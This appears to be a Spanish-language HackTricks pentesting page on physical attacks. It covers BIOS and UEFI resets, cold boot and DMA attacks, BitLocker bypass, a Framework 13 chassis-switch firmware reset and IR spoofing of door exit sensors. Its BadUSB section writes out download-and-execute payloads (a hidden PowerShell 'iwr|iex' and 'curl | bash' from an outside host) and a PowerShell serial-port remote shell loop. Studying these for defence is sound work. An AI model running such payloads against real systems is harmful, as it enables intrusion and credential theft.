# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperación de contraseña del BIOS y seguridad del sistema

**Restablecer el BIOS** se puede lograr de varias maneras. La mayoría de las placas base incluyen una **batería** que, al retirarse durante aproximadamente **30 minutos**, restablecerá los ajustes del BIOS, incluida la contraseña. Alternativamente, se puede ajustar un **jumper en la placa base** para restablecer estos ajustes conectando pines específicos.

Cuando los ajustes de hardware no son posibles o prácticos, las **herramientas de software** ofrecen una solución. Ejecutar un sistema desde un **Live CD/USB** con distribuciones como **Kali Linux** permite acceder a herramientas como **_killCmos_** y **_CmosPWD_**, que pueden ayudar en la recuperación de la contraseña del BIOS.

En casos donde la contraseña del BIOS es desconocida, introducirla incorrectamente **tres veces** suele dar como resultado un código de error. Este código puede usarse en sitios como [https://bios-pw.org](https://bios-pw.org) para recuperar potencialmente una contraseña usable.

### Seguridad UEFI

Para sistemas modernos que usan **UEFI** en lugar del BIOS tradicional, la herramienta **chipsec** puede utilizarse para analizar y modificar los ajustes de UEFI, incluido desactivar **Secure Boot**. Esto se puede lograr con el siguiente comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Análisis de RAM y Cold Boot Attacks

RAM retiene datos brevemente después de cortar la alimentación, normalmente por **1 a 2 minutos**. Esta persistencia puede extenderse hasta **10 minutos** aplicando sustancias frías, como nitrógeno líquido. Durante este periodo extendido, se puede crear un **memory dump** usando herramientas como **dd.exe** y **volatility** para su análisis.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** es una herramienta diseñada para la **manipulación física de memoria** a través de DMA, compatible con interfaces como **FireWire** y **Thunderbolt**. Permite eludir los procedimientos de inicio de sesión parcheando la memoria para aceptar cualquier contraseña. Sin embargo, es ineficaz contra sistemas **Windows 10**.

---

## Live CD/USB para acceso al sistema

Cambiar binarios del sistema como **_sethc.exe_** o **_Utilman.exe_** por una copia de **_cmd.exe_** puede proporcionar un símbolo del sistema con privilegios de sistema. Herramientas como **chntpw** pueden usarse para editar el archivo **SAM** de una instalación de Windows, permitiendo cambiar contraseñas.

**Kon-Boot** es una herramienta que facilita iniciar sesión en sistemas Windows sin conocer la contraseña al modificar temporalmente el kernel de Windows o el UEFI. Más información en [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Manejo de características de seguridad de Windows

### Atajos de arranque y recuperación

- **Supr**: Acceder a la configuración del BIOS.
- **F8**: Entrar en modo de recuperación.
- Presionar **Shift** después del banner de Windows puede omitir el autologon.

### BAD USB Devices

Dispositivos como **Rubber Ducky** y **Teensyduino** sirven como plataformas para crear dispositivos **bad USB**, capaces de ejecutar payloads predefinidos cuando se conectan a un equipo objetivo.

### Volume Shadow Copy

Los privilegios de administrador permiten la creación de copias de archivos sensibles, incluido el archivo **SAM**, mediante PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Implantes basados en ESP32-S3 como **Evil Crow Cable Wind** se ocultan dentro de cables USB-A→USB-C o USB-C↔USB-C, se enumeran puramente como un teclado USB y exponen su pila C2 sobre Wi‑Fi. El operador solo necesita alimentar el cable desde el host de la víctima, crear un hotspot llamado `Evil Crow Cable Wind` con la contraseña `123456789` y navegar a [http://cable-wind.local/](http://cable-wind.local/) (o a su dirección DHCP) para acceder a la interfaz HTTP embebida.
- La UI del navegador ofrece pestañas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* y *Config*. Los payloads almacenados están etiquetados por OS, los layouts de teclado se cambian sobre la marcha, y las cadenas VID/PID pueden alterarse para imitar periféricos conocidos.
- Como el C2 vive dentro del cable, un teléfono puede preparar payloads, desencadenar su ejecución y gestionar credenciales Wi‑Fi sin tocar el OS anfitrión — ideal para intrusiones físicas de corta duración.

### OS-aware AutoExec payloads

- Las reglas AutoExec vinculan uno o varios payloads para ejecutarse inmediatamente después de la enumeración USB. El implante realiza fingerprinting ligero del OS y selecciona el script coincidente.
- Flujo de ejemplo:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como la ejecución es desatendida, simplemente cambiar un cable de carga puede lograr el acceso inicial “plug-and-pwn” bajo el contexto del usuario conectado.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Un payload almacenado abre una consola y pega un bucle que ejecuta lo que llegue al nuevo dispositivo serial USB. Una variante mínima para Windows es:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** El implante mantiene el canal USB CDC abierto mientras su ESP32-S3 lanza un cliente TCP (Python script, Android APK, or desktop executable) de vuelta al operador. Cualquier byte tecleado en la sesión TCP se reenvía al bucle serial anterior, proporcionando ejecución remota de comandos incluso en hosts air-gapped. La salida es limitada, por lo que los operadores suelen ejecutar comandos a ciegas (creación de cuentas, staging de herramientas adicionales, etc.).

### HTTP OTA update surface

- La misma pila web suele exponer actualizaciones de firmware no autenticadas. Evil Crow Cable Wind escucha en `/update` y flashea cualquier binario que se suba:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Los operadores de campo pueden intercambiar funciones en caliente (p. ej., flash USB Army Knife firmware) durante el engagement sin abrir el cable, permitiendo que el implant pivote a nuevas capacidades mientras sigue conectado al host objetivo.

## Eludir la encriptación de BitLocker

Es posible eludir la encriptación de BitLocker si la **contraseña de recuperación** se encuentra dentro de un volcado de memoria (**MEMORY.DMP**). Se pueden utilizar herramientas como **Elcomsoft Forensic Disk Decryptor** o **Passware Kit Forensic** para este propósito.

---

## Ingeniería social para añadir una clave de recuperación

Se puede añadir una nueva clave de recuperación de BitLocker mediante tácticas de ingeniería social, convenciendo al usuario de ejecutar un comando que añade una nueva clave de recuperación compuesta por ceros, simplificando así el proceso de descifrado.

---

## Explotación de interruptores de intrusión del chasis / de mantenimiento para restablecer de fábrica el BIOS

Muchos portátiles modernos y desktops de pequeño factor de forma incluyen un **interruptor de intrusión del chasis** que es monitorizado por el Embedded Controller (EC) y el firmware BIOS/UEFI. Aunque la finalidad principal del interruptor es generar una alerta cuando se abre el dispositivo, los proveedores a veces implementan un **atajo de recuperación no documentado** que se activa cuando el interruptor se pulsa en un patrón específico.

### Cómo funciona el ataque

1. El interruptor está cableado a una **interrupción GPIO** en el EC.
2. El firmware que se ejecuta en el EC registra el **tiempo y el número de pulsaciones**.
3. Cuando se reconoce un patrón codificado, el EC invoca una rutina *mainboard-reset* que **borra el contenido del NVRAM/CMOS del sistema**.
4. En el siguiente arranque, la BIOS carga valores por defecto – **la contraseña de supervisor, las claves de Secure Boot y toda la configuración personalizada son borradas**.

> Una vez que Secure Boot está deshabilitado y la contraseña del firmware ha desaparecido, el atacante puede simplemente arrancar cualquier imagen de OS externa y obtener acceso sin restricciones a los discos internos.

### Ejemplo del mundo real – Framework 13 Laptop

El atajo de recuperación para el Framework 13 (11th/12th/13th-gen) es:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Después del décimo ciclo, el EC establece una bandera que indica al BIOS que borre la NVRAM en el siguiente reinicio. Todo el procedimiento dura ~40 s y requiere **nada más que un destornillador**.

### Generic Exploitation Procedure

1. Power-on o suspend-resume el objetivo para que el EC esté en funcionamiento.
2. Retire la tapa inferior para exponer el interruptor de intrusion/maintenance.
3. Reproduzca el patrón de conmutación específico del vendor (consultar documentación, foros, o reverse-engineer el firmware del EC).
4. Vuelva a montar y reinicie – firmware protections deberían estar deshabilitadas.
5. Arrancar desde un live USB (e.g. Kali Linux) y realizar el post-exploitation habitual (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detection & Mitigation

* Registrar eventos de chassis-intrusion en la consola de gestión del OS y correlacionarlos con reinicios inesperados del BIOS.
* Emplear **precintos anti-manipulación** en tornillos/cubiertas para detectar aperturas.
* Mantener los dispositivos en **áreas físicamente controladas**; asumir que el acceso físico equivale a una compromisión total.
* Donde esté disponible, deshabilitar la función del vendor “maintenance switch reset” o exigir una autorización criptográfica adicional para los reseteos de NVRAM.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capturar el perfil de emisión** – enganchar un logic analyser a los pines del controller para registrar tanto las formas de onda pre-detección como post-detección que alimentan el IR LED interno.
2. **Reproducir solo la forma de onda “post-detection”** – retirar/ignorar el emisor de serie y conducir un IR LED externo con el patrón ya disparado desde el inicio. Porque al receptor solo le importa el conteo/frecuencia de pulsos, trata el carrier spoofeado como una reflexión genuina y activa la línea del relay.
3. **Controlar la transmisión** – transmitir el carrier en ráfagas sintonizadas (e.g., decenas de milisegundos on, similar off) para entregar el conteo mínimo de pulsos sin saturar el AGC del receptor o la lógica de manejo de interferencias. La emisión continua desensibiliza rápidamente el sensor y evita que el relay se active.

### Long-Range Reflective Injection
- Reemplazar el LED de banco por un diodo IR de alta potencia, driver MOSFET y óptica de enfoque permite disparos fiables desde ~6 m de distancia.
- El atacante no necesita línea de visión hacia la apertura del receptor; apuntar el haz a paredes interiores, estanterías o marcos de puerta visibles a través del vidrio permite que la energía reflejada entre en el campo de visión de ~30° y emule un gesto de mano a corta distancia.
- Dado que los receptores esperan solo reflexiones débiles, un haz externo mucho más potente puede rebotar en múltiples superficies y aún así mantenerse por encima del umbral de detección.

### Weaponised Attack Torch
- Incrustar el driver dentro de una linterna comercial oculta la herramienta a la vista. Sustituir el LED visible por un IR LED de alta potencia ajustado a la banda del receptor, añadir un ATtiny412 (or similar) para generar las ráfagas ≈30 kHz, y usar un MOSFET para derivar la corriente del LED.
- Una lente telescópica de zoom estrecha el haz para rango/precisión, mientras que un motor de vibración bajo control del MCU proporciona confirmación háptica de que la modulación está activa sin emitir luz visible.
- Recorrer varios patrones de modulación almacenados (frecuencias de carrier y envolventes ligeramente diferentes) aumenta la compatibilidad entre familias de sensores rebrandadas, permitiendo al operador barrer superficies reflectantes hasta que el relay haga clic audible y la puerta se libere.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
